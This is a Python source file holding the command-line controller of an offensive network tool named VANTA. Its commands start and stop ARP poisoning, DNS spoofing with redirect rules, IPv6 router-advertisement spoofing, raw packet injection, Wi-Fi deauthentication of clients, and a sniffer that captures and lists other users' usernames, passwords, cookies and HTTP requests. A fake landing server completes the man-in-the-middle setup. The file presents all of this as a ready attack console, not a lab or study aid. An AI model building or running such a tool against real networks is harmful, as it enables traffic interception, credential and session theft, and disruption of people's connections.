# ============================================================
#  File: vanta/cli/commands.py
# ============================================================
import os
import shlex
import time
from datetime import datetime

from .. import theme as T
from ..core.iface import (list_interfaces, get_interface,
                          get_default_gateway, get_interface_for_ip,
                          set_ip_forwarding)
from ..core.config import get_config
from ..attacks import (ArpPoison, DnsSpoofer,
                       RaSpoofer, PacketInjector)
from ..sniff import Snare
from ..report import Session, export_json, export_html
from . import render


HELP_TEXT = f"""
{T.CYAN}AVAILABLE COMMANDS{T.RST}

{T.GREEN}Interface & Target{T.RST}
  ifaces                          list all interfaces
  set iface <name>                select interface
  set gateway <ip>                set gateway IP
  set target <ip>                 set target IP
  scan                            auto-detect gateway + scan ARP table
  show                            print current config
  targets                         list known hosts from ARP table

{T.GREEN}Attacks{T.RST}
  poison start [broadcast]        start ARP poisoning
  poison stop                     stop ARP poisoning
  dns start                       start DNS spoofer
  dns stop                        stop DNS spoofer
  dns rule <domain> <ip>          add DNS rule (use * for wildcard)
  dns rules                       list DNS rules
  dns clear                       clear DNS rules
  ra start | stop                 IPv6 router advertisement spoofer
  inject <kind> key=val ...       send one packet (arp|icmp|udp|tcp|dns)
  attacks                         list running attacks

{T.GREEN}Sniffing{T.RST}
  snare start | stop              credential + cookie sniffer
  creds                           show captured credentials
  cookies                         show captured cookies
  requests                        show captured HTTP requests
  snare clear                     clear captures

{T.GREEN}Wireless (monitor-mode card){T.RST}
  wifi check                      probe card capabilities
  wifi scan                       passive scan for nearby APs
  deauth bssid <mac> [client <mac>] [channel N] [count N]
                                  disconnect a client (or all)
  deauth stop                     stop + reset wifi card

{T.GREEN}Serving{T.RST}
  serve start [port]              auto-serve a landing page on HTTP
  serve stop                      stop the built-in server
  sysctl show                     display current forwarding settings

{T.GREEN}Session{T.RST}
  status                          live stats for every attack
  export json <path>              dump session to JSON
  export html <path>              dump session to HTML report
  save                            auto-save session to .vanta_sessions/
  clear                           clear the screen
  help                            this text
  exit | quit                     leave VANTA
"""


class CommandHandler:
    def __init__(self, logger):
        self.cfg = get_config()
        self.log = logger
        self.arp = None  # set by shell after core starts
        self.snare = Snare(self.cfg, logger)
        self.attacks = {}   # name -> Attack instance
        self.injector = None
        self.session = Session.from_config(self.cfg)

    # ------------------------------------------------------------------
    def dispatch(self, line: str) -> bool:
        """Return False to exit the shell."""
        line = line.strip()
        if not line or line.startswith("#"):
            return True
        try:
            parts = shlex.split(line)
        except ValueError as e:
            self.log.err(f"parse error: {e}")
            return True

        cmd = parts[0].lower()
        try:
            return self._route(cmd, parts[1:])
        except Exception as e:
            self.log.err(f"{cmd}: {e}")
            return True

    # ------------------------------------------------------------------
    def _route(self, cmd, args) -> bool:
        # ---- meta ----
        if cmd in ("exit", "quit", "q"):
            return False
        if cmd == "help" or cmd == "?":
            print(HELP_TEXT)
            return True
        if cmd == "clear":
            os.system("cls" if os.name == "nt" else "clear")
            return True
        # ----- deauth -----
        if cmd == "wifi":
            return self._wifi(args)
        if cmd == "deauth":
            return self._deauth(args)

        # ---- interface & target ----
        if cmd == "ifaces":
            for i in list_interfaces():
                try:
                    iface = get_interface(i)
                    print(f"  {T.GREEN}{i:<12}{T.RST} "
                          f"{iface.ipv4 or '-':<16} {iface.mac or '-'}")
                except Exception:
                    print(f"  {T.GREEN}{i}{T.RST}")
            return True

        if cmd == "set" and len(args) == 2:
            return self._do_set(args[0], args[1])

        if cmd == "scan":
            return self._do_scan()

        if cmd == "show":
            return self._do_show()

        if cmd == "targets":
            return self._do_targets()

        # ---- attacks ----
        if cmd == "poison":
            return self._poison(args)
        if cmd == "dns":
            return self._dns(args)
        if cmd == "ra":
            return self._ra(args)
        if cmd == "inject":
            return self._inject(args)
        if cmd == "attacks":
            return self._list_attacks()

        # ---- sniffer ----
        if cmd == "snare":
            return self._snare(args)
        if cmd == "creds":
            return self._show_creds()
        if cmd == "cookies":
            return self._show_cookies()
        if cmd == "requests":
            return self._show_requests()

        # ---- session ----
        if cmd == "status":
            return self._status()
        if cmd == "export" and len(args) >= 2:
            return self._export(args[0], " ".join(args[1:]))
        if cmd == "save":
            return self._save_session()
        # ---- server -----
        if cmd == "serve":
            return self._serve(args)
        if cmd == "sysctl":
            return self._sysctl(args)

        self.log.warn(f"unknown command: {cmd}  (try 'help')")
        return True

    # ==================================================================
    #  interface & target
    # ==================================================================
    def _do_set(self, key, value):
        key = key.lower()
        if key == "iface":
            self.cfg.iface = value
            iface = get_interface(value)
            self.cfg.attacker_mac = iface.mac
            self.cfg.attacker_ip = iface.ipv4
            self.log.ok(f"iface = {value}  ({iface.ipv4} / {iface.mac})")
            return True
        if key == "gateway":
            self.cfg.gateway_ip = value
            if self.arp:
                self.cfg.gateway_mac = self.arp.get(value)
            self.log.ok(f"gateway = {value}  mac={self.cfg.gateway_mac}")
            return True
        if key == "target":
            self.cfg.target_ip = value
            if self.arp:
                self.cfg.target_mac = self.arp.get(value)
            self.log.ok(f"target = {value}  mac={self.cfg.target_mac}")
            return True
        if key == "rate":
            try:
                self.cfg.packet_rate = float(value)
                self.log.ok(f"rate = {value} pkt/s")
            except ValueError:
                self.log.err("rate must be a number")
            return True
        self.log.warn(f"unknown key: {key}")
        return True

    def _do_scan(self):
        if not self.cfg.iface:
            self.log.err("select an interface first: 'set iface eth0'")
            return True
        iface = get_interface(self.cfg.iface)
        self.cfg.attacker_ip = iface.ipv4
        self.cfg.attacker_mac = iface.mac

        gw = get_default_gateway()
        if gw:
            self.cfg.gateway_ip = gw
            if self.arp:
                # force a refresh then read
                self.arp.refresh()
                # trigger ARP resolution
                try:
                    import subprocess
                    subprocess.run(["ping", "-c", "1", "-W", "1", gw],
                                   stdout=subprocess.DEVNULL,
                                   stderr=subprocess.DEVNULL)
                except Exception:
                    pass
                self.arp.refresh()
                self.cfg.gateway_mac = self.arp.get(gw)
            self.log.ok(f"gateway detected: {gw}  mac={self.cfg.gateway_mac}")

        self.log.step("ARP sweep")
        found = self.arp.sweep() if self.arp else 0
        self.log.ok(f"ping sweep found {found} hosts")
        table = self.arp.all() if self.arp else {}

        if table:
            rows = [(ip, mac) for ip, mac in sorted(table.items())]
            render.table(["IP", "MAC"], rows)
        else:
            self.log.warn("no ARP entries — try pinging a host first")
        self.log.info("use 'set target <ip>' to lock a target")
        return True

    def _do_show(self):
        c = self.cfg
        rows = [
            ("iface",       c.iface or "-"),
            ("attacker_ip", c.attacker_ip or "-"),
            ("attacker_mac", c.attacker_mac or "-"),
            ("gateway_ip",  c.gateway_ip or "-"),
            ("gateway_mac", c.gateway_mac or "-"),
            ("target_ip",   c.target_ip or "-"),
            ("target_mac",  c.target_mac or "-"),
            ("packet_rate", f"{c.packet_rate} pkt/s"),
            ("dns_rules",   len(c.dns_rules)),
        ]
        print()
        for k, v in rows:
            render.kv(k, v)
        print()
        return True

    def _do_targets(self):
        if not self.arp:
            self.log.warn("ARP table not running")
            return True
        self.arp.refresh()
        t = self.arp.all()
        if not t:
            self.log.warn("no hosts in ARP table")
            return True
        rows = [(ip, mac) for ip, mac in sorted(t.items())]
        render.table(["IP", "MAC"], rows)
        return True

    # ==================================================================
    #  poison
    # ==================================================================
    def _poison(self, args):
        if not args:
            self.log.warn("usage: poison start | stop")
            return True
        sub = args[0].lower()
        if sub == "start":
            broadcast = "broadcast" in args
            atk = ArpPoison(self.cfg, self.log, broadcast=broadcast)
            if atk.start():
                self.attacks["poison"] = atk
            return True
        if sub == "stop":
            atk = self.attacks.get("poison")
            if atk:
                atk.stop()
            else:
                self.log.warn("poison not running")
            return True
        self.log.warn("usage: poison start | stop")
        return True

    # ==================================================================
    #  dns
    # ==================================================================
    def _dns(self, args):
        if not args:
            self.log.warn("usage: dns start | stop | rule <d> <ip> | rules | clear")
            return True
        sub = args[0].lower()
        if sub == "rule" and len(args) >= 3:
            self.cfg.dns_rules[args[1]] = args[2]
            self.log.ok(f"dns rule: {args[1]} → {args[2]}")
            return True
        if sub == "rules":
            if not self.cfg.dns_rules:
                self.log.info("no dns rules")
            else:
                for d, ip in self.cfg.dns_rules.items():
                    render.kv(d, ip)
            return True
        if sub == "clear":
            self.cfg.dns_rules.clear()
            self.log.ok("dns rules cleared")
            return True
        if sub == "start":
            atk = DnsSpoofer(self.cfg, self.log)
            if atk.start():
                self.attacks["dns"] = atk
            return True
        if sub == "stop":
            atk = self.attacks.get("dns")
            if atk:
                atk.stop()
            else:
                self.log.warn("dns not running")
            return True
        return True

    # ==================================================================
    #  ra / cam
    # ==================================================================
    def _ra(self, args):
        return self._simple("ipv6-ra", RaSpoofer, args)

    def _simple(self, name, cls, args):
        if not args:
            self.log.warn(f"usage: {name} start|stop")
            return True
        if args[0] == "start":
            atk = cls(self.cfg, self.log)
            if atk.start():
                self.attacks[name] = atk
            return True
        if args[0] == "stop":
            atk = self.attacks.get(name)
            if atk:
                atk.stop()
            else:
                self.log.warn(f"{name} not running")
            return True
        return True

    # ==================================================================
    #  inject
    # ==================================================================
    def _inject(self, args):
        if not args:
            self.log.warn("usage: inject arp|icmp|udp|tcp|dns key=val …")
            return True
        kind = args[0]
        kwargs = {}
        for a in args[1:]:
            if "=" in a:
                k, v = a.split("=", 1)
                kwargs[k] = v
        if self.injector is None:
            self.injector = PacketInjector(self.cfg, self.log)
            self.injector.setup()
        self.injector.craft(kind, **kwargs)
        return True

    # ==================================================================
    #  sniffer
    # ==================================================================
    def _snare(self, args):
        if not args:
            self.log.warn("usage: snare start | stop | clear")
            return True
        sub = args[0].lower()
        if sub == "start":
            try:
                self.snare.start()
            except Exception as e:
                self.log.err(f"snare: {e}")
            return True
        if sub == "stop":
            self.snare.stop()
            return True
        if sub == "clear":
            self.snare.clear()
            self.log.ok("snare captures cleared")
            return True
        return True

    def _show_creds(self):
        creds = self.snare.credentials
        if not creds:
            self.log.info("no credentials captured yet")
            return True
        rows = []
        for c in creds:
            rows.append((
                c.get("type", ""),
                c.get("src", ""),
                c.get("host", ""),
                c.get("username", c.get("value", "")),
                c.get("password", ""),
            ))
        render.table(["TYPE", "SRC", "HOST", "USERNAME", "PASSWORD"], rows)
        return True

    def _show_cookies(self):
        cookies = self.snare.cookies
        if not cookies:
            self.log.info("no cookies captured")
            return True
        rows = [(c["host"], c["name"], c["value"][:40]) for c in cookies]
        render.table(["HOST", "NAME", "VALUE"], rows)
        return True

    def _show_requests(self):
        reqs = list(self.snare.requests)
        if not reqs:
            self.log.info("no HTTP requests captured")
            return True
        rows = [(r.get("method", ""), r.get("host", ""),
                 r.get("path", "")[:60]) for r in reqs[-40:]]
        render.table(["METHOD", "HOST", "PATH"], rows)
        return True

    # ==================================================================
    #  status / session
    # ==================================================================
    def _list_attacks(self):
        if not self.attacks:
            self.log.info("no attacks running")
            return True
        for name, atk in self.attacks.items():
            st = atk.state.value
            up = f"{atk.uptime():.0f}s"
            self.log.info(f"{name:<14} {st:<10} uptime={up}  {atk.stats}")
        return True

    def _status(self):
        # attacks
        print()
        print(f"  {T.CYAN}ATTACKS{T.RST}")
        if not self.attacks:
            print(f"    {T.DIM}none running{T.RST}")
        else:
            rows = [(name, atk.state.value, f"{atk.uptime():.0f}s")
                    for name, atk in self.attacks.items()]
            render.table(["NAME", "STATE", "UPTIME"], rows)
        # snare
        print(f"\n  {T.CYAN}SNARE{T.RST}")
        if self.snare.is_running():
            render.kv("state", "running")
        else:
            render.kv("state", "stopped")
        render.kv("creds",   len(self.snare.credentials))
        render.kv("cookies", len(self.snare.cookies))
        render.kv("requests", self.snare.stats["packets"])
        print()
        return True

    def _export(self, kind, path):
        kind = kind.lower()
        self._refresh_session()
        if kind == "json":
            export_json(self.session, path)
            self.log.ok(f"json report → {path}")
        elif kind == "html":
            export_html(self.session, path)
            self.log.ok(f"html report → {path}")
        else:
            self.log.warn("usage: export json|html <path>")
        return True

    def _save_session(self):
        self._refresh_session()
        name = f"vanta_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        path = os.path.join(self.cfg.session_dir, name)
        export_json(self.session, path)
        self.log.ok(f"session saved → {path}")
        return True

    def _refresh_session(self):
        self.session.iface = self.cfg.iface
        self.session.gateway_ip = self.cfg.gateway_ip
        self.session.gateway_mac = self.cfg.gateway_mac
        self.session.attacker_ip = self.cfg.attacker_ip
        self.session.attacker_mac = self.cfg.attacker_mac
        self.session.targets = [{"ip": ip, "mac": mac}
                                for ip, mac in (self.arp.all() if self.arp else {}).items()]
        self.session.attacks = [atk.info() for atk in self.attacks.values()]
        self.session.credentials = list(self.snare.credentials)
        self.session.cookies = list(self.snare.cookies)
        self.session.requests = list(self.snare.requests)
        self.session.logs = self.log.dump()
        self.session.finish()

    def _serve(self, args):
        if not args:
            self.log.warn("usage: serve start [port] | stop | status")
            return True
        sub = args[0].lower()

        if sub == "status":
            running = self.cfg.auto_serve
            self.log.info(f"auto-serve (on DNS hit): {running}")
            return True

        if sub == "start":
            self.cfg.auto_serve = True
            if len(args) > 1:
                try:
                    self.cfg.serve_port = int(args[1])
                except ValueError:
                    pass
            from ..core import Firewall
            Firewall(self.log).open_tcp(self.cfg.serve_port)
            from ..serve import FakeServer
            self._server = FakeServer(
                logger=self.log, port=self.cfg.serve_port,
                bind=self.cfg.serve_bind,
                root=self.cfg.serve_root or None,
                page_html=self.cfg.serve_page or None,
            )
            self._server.start()
            return True

        if sub == "stop":
            self.cfg.auto_serve = False
            if getattr(self, "_server", None):
                self._server.stop()
                self._server = None
            return True

        return True

    def _sysctl(self, args):
        if not args or args[0] != "show":
            self.log.warn("usage: sysctl show")
            return True
        from ..core import Sysctl
        s = Sysctl(self.log)
        for k in ("net.ipv4.ip_forward",
                  "net.ipv6.conf.all.forwarding"):
            self.log.info(f"{k} = {s.get(k)}")
        return True

    # ================================================================
    #                     DEAUTHER

    def _wifi(self, args):
        if not args:
            self.log.warn("usage: wifi scan | wifi check")
            return True
        if args[0] == "check":
            from ..core import wireless
            if not self.cfg.iface:
                self.log.warn("pick an iface first")
                return True
            caps = wireless.check_capabilities(self.cfg.iface)
            self.log.info(f"iface        {caps.iface}")
            self.log.info(f"driver       {caps.driver}")
            self.log.info(f"monitor      "
                          f"{'YES' if caps.supports_monitor else 'NO'}")
            self.log.info(f"injection    "
                          f"{'YES' if caps.supports_injection else 'NO'}")
            self.log.info(f"note         {caps.reason}")
            return True
        if args[0] == "scan":
            from ..attacks.deauth import ApScanner
            self.log.step("AP scan (15s)")
            try:
                results = ApScanner(self.cfg, self.log).scan(seconds=15)
            except Exception as e:
                self.log.err(f"scan failed: {e}")
                return True
            if not results:
                self.log.warn("no APs found")
                return True
            rows = [(r["bssid"], r["ssid"] or "(hidden)",
                     str(r["channel"]),
                     f"{r['signal_dbm']} dBm"
                     if r["signal_dbm"] is not None else "-")
                    for r in results]
            render.table(["BSSID", "SSID", "CH", "SIGNAL"], rows)
            self.log.info("use 'deauth bssid <mac> [client <mac>] "
                          "[channel N]' to attack")
            return True
        self.log.warn("usage: wifi scan | wifi check")
        return True

    def _deauth(self, args):
        if not args:
            self.log.warn(
                "usage: deauth bssid <mac> [client <mac>] "
                "[channel N] [count N]  |  deauth stop")
            return True
        if args[0] == "stop":
            atk = self.attacks.get("deauth")
            if atk:
                atk.stop()
            from ..core import wireless
            if self.cfg.iface:
                wireless.reset_wifi_card(self.cfg.iface, self.log)
            return True

        opts = {}
        i = 0
        while i < len(args):
            if i + 1 < len(args):
                opts[args[i].lower()] = args[i + 1]
                i += 2
            else:
                i += 1

        bssid = opts.get("bssid")
        if not bssid:
            self.log.warn("deauth needs bssid=<mac>")
            return True

        from ..attacks.deauth import Deauther
        atk = Deauther(
            self.cfg, self.log,
            bssid=bssid,
            client=opts.get("client"),
            channel=int(opts["channel"]) if "channel" in opts else None,
            count=int(opts["count"]) if "count" in opts else 0,
        )
        if atk.start():
            self.attacks["deauth"] = atk
        return True      

    # ==================================================================
    def shutdown(self):
        for atk in list(self.attacks.values()):
            try:
                atk.stop()
            except Exception:
                pass
        try:
            self.snare.stop()
        except Exception:
            pass
